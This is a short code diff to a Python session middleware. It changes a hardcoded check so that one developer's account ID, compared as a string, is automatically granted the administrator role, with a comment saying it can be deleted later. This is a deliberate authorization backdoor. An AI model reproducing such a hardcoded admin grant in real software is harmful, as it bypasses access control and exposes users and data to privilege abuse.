@@ -34,7 +34,7 @@ class SessionCheckMiddleware:
                     request.is_session_valid = True
                     request.user_cid = data.get('cid')
                     request.user_roles = data.get('roles', [])
-                    if request.user_cid == 1745968: #CID of the developer(Eric) can be deleted at all timme when I am gone :)
+                    if request.user_cid == "1745968": #CID of the developer(Eric) can be deleted at all timme when I am gone :)
                        request.user_roles.append("administrator")
             except requests.RequestException:
                 pass
